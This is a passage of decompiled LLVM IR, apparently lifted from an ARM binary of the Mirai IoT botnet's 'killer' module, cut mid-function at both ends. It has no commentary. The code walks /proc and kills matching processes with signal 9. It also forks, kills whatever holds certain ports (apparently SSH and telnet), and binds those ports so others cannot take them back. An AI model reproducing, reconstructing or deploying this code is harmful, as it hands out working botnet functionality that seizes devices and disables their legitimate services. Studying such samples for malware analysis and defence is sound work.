  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_19ab8.73 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8416 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @r7, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp251 = icmp slt i32 %v0_cf54, 1
  %storemerge212 = select i1 %tmp251, i32 %., i32 1
  store i32 %storemerge212, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24f88.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge212, 0
  store i32 %v0_cf54, i32* @global_var_24f88.71, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d278, %dec_label_pc_d15c, %entry
  %v1_cf8c = phi i32 [ %v2_d214, %dec_label_pc_d15c ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d278 ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-256 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-80, align 4
  %v1_cfa8 = call i32 @killer_kill_by_port(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @socket(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf90
  %v2_cfdc = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @bind(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @listen(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd8
  %v2_cffc = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.75 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @socket(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* %r4.global-to-local, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @bind(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @listen(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d050 = load i32, i32* @r5, align 4
  store i32 %v0_d050, i32* %r2.global-to-local, align 4
  %v3_d054 = call i32 @socket(i32 2, i32 1, i32 %v0_d050)
  %v7_d058 = icmp eq i32 %v3_d054, -1
  store i32 %v3_d054, i32* @r4, align 4
  br i1 %v7_d058, label %dec_label_pc_d080, label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d048
  %v2_d068 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d068, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @bind(i32 %v3_d054, i32 %v2_d068, i32 16)
  %v0_d074 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d07c = call i32 @listen(i32 %v0_d074, i32 1)
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d064
  %v1_d084 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d098 = load i32, i32* @r5, align 4
  store i32 %v0_d098, i32* %r2.global-to-local, align 4
  %v3_d0a0 = call i32 @socket(i32 2, i32 1, i32 %v0_d098)
  %v7_d0a4 = icmp eq i32 %v3_d0a0, -1
  store i32 %v3_d0a0, i32* @r4, align 4
  br i1 %v7_d0a4, label %dec_label_pc_d0cc, label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d080
  %v2_d0b4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d0b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0bc = call i32 @bind(i32 %v3_d0a0, i32 %v2_d0b4, i32 16)
  %v0_d0c0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0c8 = call i32 @listen(i32 %v0_d0c0, i32 1)
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d080, %dec_label_pc_d0b0
  store i32 14592, i32* @r6, align 4
  %v1_d0d4 = call i32 @killer_kill_by_port(i32 5888)
  %v0_d0d8 = load i32, i32* @r6, align 4
  %v1_d0d8 = add i32 %v0_d0d8, 5
  store i32 %v1_d0d8, i32* @r6, align 4
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0e8 = load i32, i32* @r5, align 4
  store i32 %v0_d0e8, i32* %r2.global-to-local, align 4
  %v3_d0f0 = call i32 @socket(i32 2, i32 1, i32 %v0_d0e8)
  %v7_d0f4 = icmp eq i32 %v3_d0f0, -1
  store i32 %v3_d0f0, i32* %r4.global-to-local, align 4
  br i1 %v7_d0f4, label %dec_label_pc_d11c, label %dec_label_pc_d100

dec_label_pc_d100:                                ; preds = %dec_label_pc_d0cc
  %v2_d104 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d104, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d10c = call i32 @bind(i32 %v3_d0f0, i32 %v2_d104, i32 16)
  %v0_d110 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d118 = call i32 @listen(i32 %v0_d110, i32 1)
  br label %dec_label_pc_d11c

dec_label_pc_d11c:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d100
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d128 = load i32, i32* @r5, align 4
  store i32 %v0_d128, i32* %r2.global-to-local, align 4
  %v3_d130 = call i32 @socket(i32 2, i32 1, i32 %v0_d128)
  %v7_d134 = icmp eq i32 %v3_d130, -1
  store i32 %v3_d130, i32* @r4, align 4
  br i1 %v7_d134, label %dec_label_pc_d15c, label %dec_label_pc_d140

dec_label_pc_d140:                                ; preds = %dec_label_pc_d11c
  %v2_d144 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d144, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d14c = call i32 @bind(i32 %v3_d130, i32 %v2_d144, i32 16)
  %v0_d150 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d158 = call i32 @listen(i32 %v0_d150, i32 1)
  br label %dec_label_pc_d15c

dec_label_pc_d15c:                                ; preds = %dec_label_pc_d11c, %dec_label_pc_d140
  %v1_d160 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d168 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_22468.77 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24f84.79 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d168, i32* %r2.global-to-local, align 4
  %v0_d178 = load i32, i32* @r5, align 4
  %v1_d178 = trunc i32 %v0_d178 to i8
  %v3_d178 = inttoptr i32 %v0_d168 to i8*
  store i8 %v1_d178, i8* %v3_d178, align 1
  %v0_d180 = load i32, i32* @r5, align 4
  %v1_d180 = load i32, i32* %r3.global-to-local, align 4
  %v2_d180 = inttoptr i32 %v1_d180 to i32*
  store i32 %v0_d180, i32* %v2_d180, align 4
  %v0_d184 = load i32, i32* %r2.global-to-local, align 4
  %v1_d184 = load i32, i32* %r1.global-to-local, align 4
  %v2_d184 = inttoptr i32 %v1_d184 to i32*
  store i32 %v0_d184, i32* %v2_d184, align 4
  %v1_d188 = call i32 @table_unlock_val(i32 15)
  %v1_d190 = call i32 @table_unlock_val(i32 16)
  %v2_d198 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d198, i32* %r2.global-to-local, align 4
  %v0_d19c = load i32, i32* @r5, align 4
  store i32 %v0_d19c, i32* %r1.global-to-local, align 4
  %v2_d1a8 = inttoptr i32 %v0_d19c to i32*
  %v3_d1a8 = call i32 @table_retrieve_val(i32 15, i32* %v2_d1a8)
  %v1_d1b0 = add i32 %v2_d198, -56
  store i32 %v1_d1b0, i32* %r3.global-to-local, align 4
  store i32 %v3_d1a8, i32* %r1.global-to-local, align 4
  store i32 %v1_d1b0, i32* @r0, align 4
  %v2_d1c0 = inttoptr i32 %v1_d1b0 to i8*
  %v3_d1c0 = call i32 @util_strcpy(i8* %v2_d1c0, i32 %v3_d1a8)
  %v2_d1c8 = add i32 %v3_d1c0, %v1_d1b0
  store i32 %v2_d1c8, i32* @r4, align 4
  %v1_d1cc = call i32 @__getpid(i32 %v3_d1c0)
  %v2_d1d4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_d1d4, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d1dc = trunc i32 %v1_d1cc to i8
  %v4_d1dc = call i32 @util_itoa(i8 %v3_d1dc, i32 10, i32 %v2_d1d4)
  store i32 %v4_d1dc, i32* %r1.global-to-local, align 4
  %v0_d1e4 = load i32, i32* @r4, align 4
  store i32 %v0_d1e4, i32* @r0, align 4
  %v2_d1e8 = inttoptr i32 %v0_d1e4 to i8*
  %v3_d1e8 = call i32 @util_strcpy(i8* %v2_d1e8, i32 %v4_d1dc)
  %v0_d1ec = load i32, i32* @r5, align 4
  store i32 %v0_d1ec, i32* %r1.global-to-local, align 4
  %v1_d1f0 = load i32, i32* @r4, align 4
  %v2_d1f0 = add i32 %v1_d1f0, %v3_d1e8
  store i32 %v2_d1f0, i32* @r4, align 4
  %v2_d1f8 = inttoptr i32 %v0_d1ec to i32*
  %v3_d1f8 = call i32 @table_retrieve_val(i32 16, i32* %v2_d1f8)
  store i32 %v3_d1f8, i32* %r1.global-to-local, align 4
  %v0_d200 = load i32, i32* @r4, align 4
  store i32 %v0_d200, i32* @r0, align 4
  %v2_d204 = inttoptr i32 %v0_d200 to i8*
  %v3_d204 = call i32 @util_strcpy(i8* %v2_d204, i32 %v3_d1f8)
  %v0_d208 = load i32, i32* @r5, align 4
  store i32 %v0_d208, i32* %r1.global-to-local, align 4
  store i32 %v3_d204, i32* @r6, align 4
  %v2_d214 = call i32 @__libc_open(i32 %v1_d1b0, i32 %v0_d208)
  %v7_d218 = icmp eq i32 %v2_d214, -1
  br i1 %v7_d218, label %dec_label_pc_cf80, label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d15c
  %v1_d220 = call i32 @__GI___libc_close(i32 %v2_d214)
  %v1_d228 = call i32 @table_lock_val(i32 15)
  %v1_d230 = call i32 @table_lock_val(i32 16)
  store i32 ptrtoint (i32* @global_var_24f84.79 to i32), i32* %r3.global-to-local, align 4
  %v2_d23c = load i32, i32* @global_var_24f84.79, align 4
  store i32 %v2_d23c, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d248 = call i32 @readlink(i32 %v1_d1b0, i32 %v2_d23c, i32 4095)
  %v7_d24c = icmp eq i32 %v3_d248, -1
  br i1 %v7_d24c, label %.thread9, label %bb254

bb254:                                            ; preds = %dec_label_pc_d220
  %v3_d254 = load i32, i32* @global_var_24f84.79, align 4
  store i32 %v3_d254, i32* %r3.global-to-local, align 4
  %v1_d258 = load i32, i32* @r5, align 4
  %v2_d258 = trunc i32 %v1_d258 to i8
  %v5_d258 = add i32 %v3_d254, %v3_d248
  %v6_d258 = inttoptr i32 %v5_d258 to i8*
  store i8 %v2_d258, i8* %v6_d258, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d220, %bb254
  store i32 %v1_d1b0, i32* @r0, align 4
  %v0_d260 = load i32, i32* @r6, align 4
  %v1_d260 = load i32, i32* @r4, align 4
  %v1_d1b0.neg = sub i32 56, %v2_d198
  %v2_d260 = add i32 %v1_d1b0.neg, %v0_d260
